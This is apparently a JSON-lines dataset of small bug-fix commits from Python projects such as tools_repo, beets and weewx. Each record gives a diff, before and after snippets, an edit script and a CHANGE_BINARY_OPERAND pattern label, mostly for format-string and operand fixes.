{"project": "tools_repo", "commit_sha": "fe0867595635b0dc007088053c5901331ac92536", "parent_sha": "be0e8ac232de862d287927c4d735cf30f040cf42", "file_path": "project.py", "project_url": "https://github.com/LineageOS/tools_repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -358,7 +358,7 @@ class Project(object):\n       else: f_status = '-'\n \n       if i and i.src_path:\n-        line = ' %s%s\\t%s => (%s%%)' % (i_status, f_status,\n+        line = ' %s%s\\t%s => %s (%s%%)' % (i_status, f_status,\n                                         i.src_path, p, i.level)\n       else:\n         line = ' %s%s\\t%s' % (i_status, f_status, p)\n", "before": "line = ' %s%s\\t%s => (%s%%)' % ( i_status , f_status , i . src_path , p , i . level )", "after": "line = ' %s%s\\t%s => %s (%s%%)' % ( i_status , f_status , i . src_path , p , i . level )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:' %s%s\\\\t%s => (%s%%)'\", 3, 16, 3, 37], \"' %s%s\\\\t%s => %s (%s%%)'\"]]"}
{"project": "tools_repo", "commit_sha": "2b5b4ac29275ee49184a8aee98f60b744890f5bb", "parent_sha": "6f6cd77a50fd4ffff360d4aee1c6bc05bfb802c1", "file_path": "git_config.py", "project_url": "https://github.com/LineageOS/tools_repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -346,7 +346,7 @@ def _open_ssh(host, port):\n \n   if not _ssh_master \\\n   or 'GIT_SSH' in os.environ \\\n-  or sys.platform == 'win32':\n+  or sys.platform in ('win32', 'cygwin'):\n     # failed earlier, or cygwin ssh can't do this\n     #\n     return False\n", "before": "if not _ssh_master or 'GIT_SSH' in os . environ or sys . platform == 'win32' : return False", "after": "if not _ssh_master or 'GIT_SSH' in os . environ or sys . platform in ( 'win32' , 'cygwin' ) : return False", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 6, 3, 29], [\"in:in\", \"T\"], 1], [\"Insert\", [\"comparison_operator\", 3, 6, 3, 29], [\"tuple\", \"N0\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"string:'win32'\", 3, 22, 3, 29], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'cygwin'\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4], [\"Delete\", [\"==:==\", 3, 19, 3, 21]]]"}
{"project": "NIPAP", "commit_sha": "8dee1221dcf8b1cd24955248c23bcd7f96a64a8d", "parent_sha": "28a9437bc6b46b8542b651d462fb7f59749e2904", "file_path": "nipap-cli/nipap_cli/nipap_cli.py", "project_url": "https://github.com/fredsod/NIPAP", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -163,7 +163,7 @@ def _expand_list_query(opts):\n         # standard case\n         operator = 'regex_match'\n         val1 = key\n-        val2 = \"^%s\" % val\n+        val2 = \"%s\" % val\n \n         query_parts.append({\n             'operator': operator,\n", "before": "val2 = \"^%s\" % val", "after": "val2 = \"%s\" % val", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"^%s\\\"\", 3, 16, 3, 21], \"\\\"%s\\\"\"]]"}
{"project": "OpenTidalFarm", "commit_sha": "ddcbed9a6d550fcc1984edc703ab4d39cd289a46", "parent_sha": "e541dfb6bda8f270f85631d2c51c671ca4bc975b", "file_path": "turbine_optimisation/shallow_water_model.py", "project_url": "https://github.com/baba-mpe/OpenTidalFarm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -256,7 +256,7 @@ def sw_solve(config, state, turbine_field=None, functional=None, annotate=True,\n                 solver_benchmark.solve(dolfin.lhs(F) == dolfin.rhs(F), state_new, solver_parameters = solver_parameters, annotate=annotate, benchmark = run_benchmark, solve = solve, solver_exclude = solver_exclude)\n             iter_counter += 1\n             if iter_counter > 0:\n-              relative_diff = abs(assemble( inner(state_new-state_nl, state_new-state_nl) * dx ))/norm(state_new)\n+              relative_diff = abs(assemble( inner(state_new-state_nl, state_new-state_nl) * dx ))/assemble( inner(state_new, state_new) * dx )\n               info_blue(\"Picard iteration \" + str(iter_counter) + \" relative difference: \" + str(relative_diff))\n \n               if relative_diff < picard_relative_tolerance:\n", "before": "relative_diff = abs ( assemble ( inner ( state_new - state_nl , state_new - state_nl ) * dx ) ) / norm ( state_new )", "after": "relative_diff = abs ( assemble ( inner ( state_new - state_nl , state_new - state_nl ) * dx ) ) / assemble ( inner ( state_new , state_new ) * dx )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"call\", 3, 99, 3, 114], [\"identifier:assemble\", \"T\"], 0], [\"Insert\", [\"call\", 3, 99, 3, 114], [\"argument_list\", \"N0\"], 1], [\"Move\", \"N0\", [\"(:(\", 3, 103, 3, 104], 0], [\"Insert\", \"N0\", [\"binary_operator\", \"N1\"], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"*:*\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dx\", \"T\"], 2], [\"Update\", [\"identifier:norm\", 3, 99, 3, 103], \"inner\"], [\"Move\", \"N2\", [\"identifier:norm\", 3, 99, 3, 103], 0], [\"Move\", \"N2\", [\"argument_list\", 3, 103, 3, 114], 1], [\"Insert\", [\"argument_list\", 3, 103, 3, 114], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 103, 3, 114], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 103, 3, 114], [\"identifier:state_new\", \"T\"], 3]]"}
{"project": "tools_repo", "commit_sha": "57bd7b717ba830753b5c6d82bb84d38047dce637", "parent_sha": "4e46520362e4c75ae7809c74f3d1c21e86852ee8", "file_path": "subcmds/info.py", "project_url": "https://github.com/LineageOS/tools_repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ class Info(PagedCommand):\n     if not self.opt.local:\n       project.Sync_NetworkHalf(quiet=True, current_branch_only=True)\n \n-    logTarget = R_M + self.manifest.default.revisionExpr\n+    logTarget = R_M + self.manifest.manifestProject.config.GetBranch(\"default\").merge\n \n     bareTmp = project.bare_git._bare\n     project.bare_git._bare = False\n", "before": "logTarget = R_M + self . manifest . default . revisionExpr", "after": "logTarget = R_M + self . manifest . manifestProject . config . GetBranch ( \"default\" ) . merge", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"attribute\", 3, 23, 3, 57], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 23, 3, 57], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 23, 3, 57], [\"identifier:merge\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:GetBranch\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"default\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Move\", \"N3\", [\"attribute\", 3, 23, 3, 44], 0], [\"Move\", \"N3\", [\".:.\", 3, 44, 3, 45], 1], [\"Update\", [\"identifier:revisionExpr\", 3, 45, 3, 57], \"config\"], [\"Move\", \"N3\", [\"identifier:revisionExpr\", 3, 45, 3, 57], 2], [\"Update\", [\"identifier:default\", 3, 37, 3, 44], \"manifestProject\"]]"}
{"project": "tools_repo", "commit_sha": "610d3c4e46471c8db555026969bb3e2eb75102f0", "parent_sha": "033a7e91de4e15c7da96f4ab21454c5f6e3b2fb6", "file_path": "subcmds/upload.py", "project_url": "https://github.com/LineageOS/tools_repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -189,7 +189,7 @@ Gerrit Code Review:  http://code.google.com/p/gerrit/\n       date = branch.date\n       commit_list = branch.commits\n \n-      destination = project.dest_branch or project.revisionExpr\n+      destination = opt.dest_branch or project.dest_branch or project.revisionExpr\n       print('Upload project %s/ to remote branch %s:' % (project.relpath, destination))\n       print('  branch %s (%2d commit%s, %s):' % (\n                     name,\n", "before": "destination = project . dest_branch or project . revisionExpr", "after": "destination = opt . dest_branch or project . dest_branch or project . revisionExpr", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 21, 3, 64], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 21, 3, 40], 2], [\"Insert\", \"N1\", [\"identifier:opt\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dest_branch\", \"T\"], 2]]"}
{"project": "tools_repo", "commit_sha": "022a1d4e6ec574d6b21febde8d2088393f42c5fb", "parent_sha": "41d1baac31e4a109480a6129c4f1f1cd2b37c1c9", "file_path": "gitc_utils.py", "project_url": "https://github.com/LineageOS/tools_repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,7 +46,7 @@ def _set_project_revisions(projects):\n       for project in projects if not git_config.IsId(project.revisionExpr)]\n   for proj, gitcmd in project_gitcmds:\n     if gitcmd.Wait():\n-      print('FATAL: Failed to retrieve revisionExpr for %s' % project)\n+      print('FATAL: Failed to retrieve revisionExpr for %s' % proj)\n       sys.exit(1)\n     proj.revisionExpr = gitcmd.stdout.split('\\t')[0]\n \n", "before": "print ( 'FATAL: Failed to retrieve revisionExpr for %s' % project )", "after": "print ( 'FATAL: Failed to retrieve revisionExpr for %s' % proj )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:project\", 3, 63, 3, 70], \"proj\"]]"}
{"project": "OpenTidalFarm", "commit_sha": "0f21986ef88a81ad2ba1ed5a07b44dafc9380a71", "parent_sha": "5a54badde793a788d709889b432acd3e13f8a7dc", "file_path": "opentidalfarm/configuration.py", "project_url": "https://github.com/baba-mpe/OpenTidalFarm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class DefaultConfiguration(object):\n         print \"Mesh element size: %f - %f\" % (hmin, hmax)\n         print \"\\n=== Optimisation settings ===\"\n         print \"Automatic functional rescaling: %s\" % self.params[\"automatic_scaling\"] \n-        print \"Automatic functional rescaling multuplier: %s\" % self.params[\"automatic_scaling_multiplier\"] \n+        print \"Automatic functional rescaling multiplier: %s\" % self.params[\"automatic_scaling_multiplier\"] \n         print \"Automatic checkpoint generation: %s\" % self.params[\"save_checkpoints\"] \n         print \"\"\n \n", "before": "print \"Automatic functional rescaling multuplier: %s\" % self . params [ \"automatic_scaling_multiplier\" ]", "after": "print \"Automatic functional rescaling multiplier: %s\" % self . params [ \"automatic_scaling_multiplier\" ]", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Automatic functional rescaling multuplier: %s\\\"\", 3, 15, 3, 62], \"\\\"Automatic functional rescaling multiplier: %s\\\"\"]]"}
{"project": "beets", "commit_sha": "1e0185188a45332335e06cff0753762890e6e54b", "parent_sha": "545ba22f948ab0357c8257664acd264592405666", "file_path": "beetsplug/smartplaylist.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -102,5 +102,5 @@ class SmartPlaylistPlugin(BeetsPlugin):\n                 m3u_path = normpath(os.path.join(playlist_dir, m3u))\n                 with open(syspath(m3u_path), 'w') as f:\n                     for path in m3us[m3u]:\n-                        f.write(path + '\\n')\n+                        f.write(path + b'\\n')\n         self._log.info(\"{0} playlists updated\", len(playlists))\n", "before": "f . write ( path + '\\n' )", "after": "f . write ( path + b'\\n' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'\\\\n'\", 3, 40, 3, 44], \"b'\\\\n'\"]]"}
{"project": "flocker", "commit_sha": "109792df9ce19703f349c69e9fb4a5a10eb0a936", "parent_sha": "613ce91f2f31b182a651225291fc410e4c0fdd34", "file_path": "admin/release.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -296,7 +296,7 @@ def publish_docs_main(args, base_path, top_level):\n                 environment=options.environment,\n                 ))\n     except NotARelease:\n-        sys.stderr.write(\"%s: Can't publish non-release.\"\n+        sys.stderr.write(\"%s: Can't publish non-release.\\n\"\n                          % (base_path.basename(),))\n         raise SystemExit(1)\n     except NotTagged:\n", "before": "NotARelease : sys . stderr . write ( \"%s: Can't publish non-release.\" % ( base_path . basename ( ) , ) )", "after": "NotARelease : sys . stderr . write ( \"%s: Can't publish non-release.\\n\" % ( base_path . basename ( ) , ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"%s: Can't publish non-release.\\\"\", 3, 26, 3, 58], \"\\\"%s: Can't publish non-release.\\\\n\\\"\"]]"}
{"project": "beets", "commit_sha": "9b9c033df6bdedee0b76c6ea72d17bb5adc501fe", "parent_sha": "80c96d98deeb6951b79cb9ed52a07083706e18ef", "file_path": "beetsplug/importfeeds.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ def _write_m3u(m3u_path, items_paths):\n     mkdirall(m3u_path)\n     with open(syspath(m3u_path), 'a') as f:\n         for path in items_paths:\n-            f.write(path + '\\n')\n+            f.write(path + b'\\n')\n \n \n class ImportFeedsPlugin(BeetsPlugin):\n", "before": "f . write ( path + '\\n' )", "after": "f . write ( path + b'\\n' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'\\\\n'\", 3, 28, 3, 32], \"b'\\\\n'\"]]"}
{"project": "beets", "commit_sha": "2dec90de7a244bd2310accfd1e02ca4f41fc523e", "parent_sha": "c91e8cb782412c4af760bff6eb9084476eeb9d59", "file_path": "test/test_mediafile.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -662,7 +662,7 @@ class ReadWriteTestBase(ArtTestMixin, GenreListTestMixin,\n                 errors.append('Tag %s does not exist' % key)\n             else:\n                 if value2 != value:\n-                    errors.append('Tag %s: %s != %s' % (key, value2, value))\n+                    errors.append('Tag %s: %r != %r' % (key, value2, value))\n         if any(errors):\n             errors = ['Tags did not match'] + errors\n             self.fail('\\n  '.join(errors))\n", "before": "else : if value2 != value : errors . append ( 'Tag %s: %s != %s' % ( key , value2 , value ) )", "after": "else : if value2 != value : errors . append ( 'Tag %s: %r != %r' % ( key , value2 , value ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'Tag %s: %s != %s'\", 3, 35, 3, 53], \"'Tag %s: %r != %r'\"]]"}
{"project": "beets", "commit_sha": "3112a18463eef4e946c95feb81f9be3f99b04cc5", "parent_sha": "8fa71f78feb4e09c46079e881f2f2e2c8686ef3d", "file_path": "beetsplug/thumbnails.py", "project_url": "https://github.com/tigranl/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -232,7 +232,7 @@ def copy_c_string(c_string):\n     # work. A more surefire way would be to allocate a ctypes buffer and copy\n     # the data with `memcpy` or somesuch.\n     s = ctypes.cast(c_string, ctypes.c_char_p).value\n-    return '' + s\n+    return b'' + s\n \n \n class GioURI(URIGetter):\n", "before": "return '' + s", "after": "return b'' + s", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:''\", 3, 12, 3, 14], \"b''\"]]"}
{"project": "weewx", "commit_sha": "b7a54689955b4a95a39850390d04a6617b8b6b74", "parent_sha": "5c14d4087eca62809db592c752918d7fbfcd0ba1", "file_path": "bin/weewx/wxengine.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -712,7 +712,7 @@ class StdRESTful(StdService):\n                 obj = weeutil.weeutil._get_object(site_dict['driver'])(site, **site_dict)\n             except KeyError, e:\n                 syslog.syslog(syslog.LOG_DEBUG, \"wxengine: Data will not be posted to %s\" % (site,))\n-                syslog.syslog(syslog.LOG_DEBUG, \"    ****  %s\" % e)\n+                syslog.syslog(syslog.LOG_DEBUG, \"    **** required parameter '%s' is not specified\" % e)\n             else:\n                 obj_list.append(obj)\n                 syslog.syslog(syslog.LOG_DEBUG, \"wxengine: Data will be posted to %s\" % (site,))\n", "before": "syslog . syslog ( syslog . LOG_DEBUG , \"    ****  %s\" % e )", "after": "syslog . syslog ( syslog . LOG_DEBUG , \"    **** required parameter '%s' is not specified\" % e )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"    ****  %s\\\"\", 3, 49, 3, 63], \"\\\"    **** required parameter '%s' is not specified\\\"\"]]"}
{"project": "django-ratings", "commit_sha": "e31e7b6a19fe6a79492c7f42c381b478e8b42d1f", "parent_sha": "236d2af678180358d321c6ece1c2397336c2f094", "file_path": "djangoratings/__init__.py", "project_url": "https://github.com/eliksir/django-ratings", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class RatingManager(object):\n             raise ValueError(\"%s is not a valid choice for %s\" % (score, self.field.name))\n         is_anonymous = (user is None or not user.is_authenticated())\n         if is_anonymous and not self.field.allow_anonymous:\n-            raise TypeError(\"user must be a user, not '%r'\" % (self.field.name, user))\n+            raise TypeError(\"user must be a user, not '%r'\" % (user,))\n         \n         if is_anonymous:\n             user = None\n", "before": "raise TypeError ( \"user must be a user, not '%r'\" % ( self . field . name , user ) )", "after": "raise TypeError ( \"user must be a user, not '%r'\" % ( user , ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\",:,\", 3, 79, 3, 80], [\"tuple\", 3, 63, 3, 86], 3], [\"Delete\", [\"identifier:self\", 3, 64, 3, 68]], [\"Delete\", [\".:.\", 3, 68, 3, 69]], [\"Delete\", [\"identifier:field\", 3, 69, 3, 74]], [\"Delete\", [\"attribute\", 3, 64, 3, 74]], [\"Delete\", [\".:.\", 3, 74, 3, 75]], [\"Delete\", [\"identifier:name\", 3, 75, 3, 79]], [\"Delete\", [\"attribute\", 3, 64, 3, 79]]]"}
{"project": "weewx", "commit_sha": "ba9d48b0dad6d714d275c12b180f7d4cd236e6d6", "parent_sha": "1ed891d2dde5c13d5ac99023d1bf4cef447490e6", "file_path": "bin/weewx/restful.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -674,7 +674,7 @@ class StationRegistry(REST):\n             except (urllib2.URLError, socket.error,\n                     httplib.BadStatusLine, httplib.IncompleteRead), e:\n                 # Unsuccessful. Log it and try again\n-                syslog.syslog(syslog.LOG_ERR, 'restful: Failed attempt %d of %d: %e' % (_count+1, self.max_tries, e))\n+                syslog.syslog(syslog.LOG_ERR, 'restful: Failed attempt %d of %d: %s' % (_count+1, self.max_tries, e))\n             else:\n                 # Check for the server response\n                 for line in _response:\n", "before": "syslog . syslog ( syslog . LOG_ERR , 'restful: Failed attempt %d of %d: %e' % ( _count + 1 , self . max_tries , e ) )", "after": "syslog . syslog ( syslog . LOG_ERR , 'restful: Failed attempt %d of %d: %s' % ( _count + 1 , self . max_tries , e ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'restful: Failed attempt %d of %d: %e'\", 3, 47, 3, 85], \"'restful: Failed attempt %d of %d: %s'\"]]"}
{"project": "weewx", "commit_sha": "4a918d8e62f981b7e6160945934e839d6176b31b", "parent_sha": "2ba9bef5421aedc9ed5018b2d27b99e8f88d3db1", "file_path": "bin/weewx/units.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -785,7 +785,7 @@ class ValueHelper(object):\n             try:\n                 conversionDict[self.value_t[1]][target_unit]\n             except KeyError:\n-                raise AttributeError, \"Illegal conversion from '%s' to %s'\"%(self.value_t[1], target_unit)\n+                raise AttributeError, \"Illegal conversion from '%s' to '%s'\"%(self.value_t[1], target_unit)\n         return ValueHelper(self.value_t, self.context, self.formatter, FixedConverter(target_unit))\n     \n     def exists(self):\n", "before": "raise AttributeError , \"Illegal conversion from '%s' to %s'\" % ( self . value_t [ 1 ] , target_unit )", "after": "raise AttributeError , \"Illegal conversion from '%s' to '%s'\" % ( self . value_t [ 1 ] , target_unit )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Illegal conversion from '%s' to %s'\\\"\", 3, 39, 3, 76], \"\\\"Illegal conversion from '%s' to '%s'\\\"\"]]"}
{"project": "weewx", "commit_sha": "5f19959b7cab2ee61f88b53b42ef71f1d1153769", "parent_sha": "8490b560f08b8d3d916836bff35795eac7d3756e", "file_path": "bin/weewx/restx.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1064,7 +1064,7 @@ class CWOPThread(RESTThread):\n             except (IOError, socket.error), e:\n                 # Unsuccessful. Log it and go around again for another try\n                 syslog.syslog(syslog.LOG_DEBUG, \"restx: %s: Attempt #%d failed: %s\" % \n-                              (_count + 1, self.protocol_name, e))\n+                              (self.protocol_name, _count + 1, e))\n             else:\n                 _resp = sock.recv(1024)\n                 return _resp\n", "before": "syslog . syslog ( syslog . LOG_DEBUG , \"restx: %s: Attempt #%d failed: %s\" % ( _count + 1 , self . protocol_name , e ) )", "after": "syslog . syslog ( syslog . LOG_DEBUG , \"restx: %s: Attempt #%d failed: %s\" % ( self . protocol_name , _count + 1 , e ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 32, 3, 42], [\"tuple\", 3, 31, 3, 66], 2], [\"Move\", [\"attribute\", 3, 44, 3, 62], [\"tuple\", 3, 31, 3, 66], 1]]"}
{"project": "weewx", "commit_sha": "eebcdbeb8a43ae69bd28869225d31c52aa3dc84b", "parent_sha": "5f19959b7cab2ee61f88b53b42ef71f1d1153769", "file_path": "bin/weewx/restx.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1036,7 +1036,7 @@ class CWOPThread(RESTThread):\n                 except socket.error, e:\n                     # Unsuccessful. Log it and try again\n                     syslog.syslog(syslog.LOG_DEBUG, \"restx: %s: Connection attempt #%d failed to \"\n-                                  \"server %s:%d: %s\" % (_count + 1, self.protocol_name, \n+                                  \"server %s:%d: %s\" % (self.protocol_name, _count + 1, \n                                                         _server, _port, e))\n                 else:\n                     syslog.syslog(syslog.LOG_DEBUG, \"restx: %s: Connected to server %s:%d\" % \n", "before": "socket . error , e : syslog . syslog ( syslog . LOG_DEBUG , \"restx: %s: Connection attempt #%d failed to \" \"server %s:%d: %s\" % ( _count + 1 , self . protocol_name , _server , _port , e ) )", "after": "socket . error , e : syslog . syslog ( syslog . LOG_DEBUG , \"restx: %s: Connection attempt #%d failed to \" \"server %s:%d: %s\" % ( self . protocol_name , _count + 1 , _server , _port , e ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 57, 3, 67], [\"tuple\", 3, 56, 4, 75], 2], [\"Move\", [\"attribute\", 3, 69, 3, 87], [\"tuple\", 3, 56, 4, 75], 1]]"}
{"project": "weewx", "commit_sha": "615e2d1e190757ae0d00024b4fc052ff9047cef3", "parent_sha": "a0769ca3de33201e9772c40ddc2a9d07276a4c6a", "file_path": "bin/weewx/drivers/simulator.py", "project_url": "https://github.com/richterb1/weewx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -187,7 +187,7 @@ class Rain(object):\n         n_rain_packets = total_rain / Rain.bucket_tip\n         self.period = int(npackets/n_rain_packets)\n         self.rain_start = 3600* rain_start\n-        self.rain_end = rain_start + 3600 * rain_length\n+        self.rain_end = self.rain_start + 3600 * rain_length\n         self.packet_number = 0\n         \n     def value_at(self, time_ts):\n", "before": "self . rain_end = rain_start + 3600 * rain_length", "after": "self . rain_end = self . rain_start + 3600 * rain_length", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 25, 3, 56], [\"attribute\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:rain_start\", 3, 25, 3, 35], 2]]"}
{"project": "django-machina", "commit_sha": "1aae6ee04164178ae323496629effc03c68e46d2", "parent_sha": "d5e94aed92c594a99959025547ff0dd9fd28c4ac", "file_path": "machina/apps/conversation/polls/abstract_models.py", "project_url": "https://github.com/eliksir/django-machina", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class AbstractTopicPollOption(models.Model):\n \n     @property\n     def percentage(self):\n-        return (self.votes.count() / len(self.poll.votes)) * 100\n+        return (self.votes.count() / (len(self.poll.votes) or 1)) * 100\n \n \n @python_2_unicode_compatible\n", "before": "return ( self . votes . count ( ) / len ( self . poll . votes ) ) * 100", "after": "return ( self . votes . count ( ) / ( len ( self . poll . votes ) or 1 ) ) * 100", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 17, 3, 58], [\"parenthesized_expression\", \"N0\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"boolean_operator\", \"N1\"], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Move\", \"N1\", [\"call\", 3, 38, 3, 58], 0], [\"Insert\", \"N1\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:1\", \"T\"], 2]]"}
{"project": "mms-coupon-generator", "commit_sha": "b7334db9ad19ac9cc18770b91d7d6c5884417af9", "parent_sha": "81621b890e7f89cb0a64964407d902d52decc96c", "file_path": "coupons/utils.py", "project_url": "https://github.com/Libardo1/mms-coupon-generator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ def _combine_images_into_coupon(logo_img, barcode_img):\n \n def _save_image(image):\n     unique_filename = str(uuid.uuid4()) + '.png'\n-    image.save(COUPON_SAVE_DIR + unique_filename_full_path)\n+    image.save(COUPON_SAVE_DIR + unique_filename)\n     return unique_filename\n \n def _send_coupon_via_mms(finished_coupon_url, recipient_number, \n", "before": "image . save ( COUPON_SAVE_DIR + unique_filename_full_path )", "after": "image . save ( COUPON_SAVE_DIR + unique_filename )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:unique_filename_full_path\", 3, 34, 3, 59], \"unique_filename\"]]"}
{"project": "larray", "commit_sha": "70e3b46f6187612082e1b8a2387ccad31c5e914c", "parent_sha": "5702279250ce25fe74bd1045e38ed1d6a10b65c9", "file_path": "larray/core.py", "project_url": "https://github.com/alixdamman/larray", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -291,7 +291,7 @@ def slice_str_to_range(s):\n     if start is None:\n         start = 0\n     if stop is None:\n-        raise ValueError(\"no stop bound provided in range: %s\" % s)\n+        raise ValueError(\"no stop bound provided in range: %r\" % s)\n     stop += 1\n     return srange(start, stop, step)\n \n", "before": "raise ValueError ( \"no stop bound provided in range: %s\" % s )", "after": "raise ValueError ( \"no stop bound provided in range: %r\" % s )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"no stop bound provided in range: %s\\\"\", 3, 26, 3, 63], \"\\\"no stop bound provided in range: %r\\\"\"]]"}
{"project": "wca_server", "commit_sha": "ebf81eb6b786642829437eec13eec7e604e3a972", "parent_sha": "94ad69c13e7c5b0270422339b03b05fcd30720cd", "file_path": "tables/housing/household_type_size_table.py", "project_url": "https://github.com/prats110892/wca_server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ class HOUSEHOLD_TYPE_SIZE_Table(Base_Table):\n \r\n \tdef __init__(self) :\r\n \t\tself.table_name = HOUSEHOLD_TYPE_SIZE_Table.table_name\r\n-\t\tself.columns = Base_Table.columns + [\"Family households\",\"2-person\",\"3-person\",\"4-person\",\"5-person\",\"6-person\",\"7-or-more person \",\"Nonfamily households\",\"1-person\",\"2-person\",\"3-person\",\"4-person\",\"5-person\",\"6-person\",\"7-or-more person\",\"Total households\",\"1-person\",\"2-person\",\"3-person\",\"4-person\",\"5-person\",\"6-person\",\"7-or-more person\"]\r\n+\t\tself.columns = Base_Table.columns + [\"Family households\",\"2-person 1\",\"3-person 1\",\"4-person 1\",\"5-person 1\",\"6-person 1\",\"7-or-more person 1\",\"Nonfamily households\",\"1-person 2\",\"2-person 2\",\"3-person 2\",\"4-person 2\",\"5-person 2\",\"6-person 2\",\"7-or-more person 2\",\"Total households\",\"1-person 3\",\"2-person 3\",\"3-person 3\",\"4-person 3\",\"5-person 3\",\"6-person 3\",\"7-or-more person 3\"]\r\n \t\tself.table_extra_meta_data = Base_Table.table_extra_meta_data\r\n \t\tself.initalize()\r\n \r\n", "before": "self . columns = Base_Table . columns + [ \"Family households\" , \"2-person\" , \"3-person\" , \"4-person\" , \"5-person\" , \"6-person\" , \"7-or-more person \" , \"Nonfamily households\" 